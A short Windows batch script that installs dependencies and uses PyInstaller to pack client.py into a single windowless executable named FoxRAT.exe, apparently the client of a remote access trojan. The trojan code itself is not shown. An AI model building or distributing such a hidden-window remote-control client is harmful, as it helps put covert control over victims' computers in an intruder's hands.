@echo off
echo Installing dependencies...
pip install -r requirements.txt pyinstaller
echo Building...
pyinstaller --onefile --noconsole --name FoxRAT --icon=NUL client.py
echo Done! Check dist\FoxRAT.exe
pause
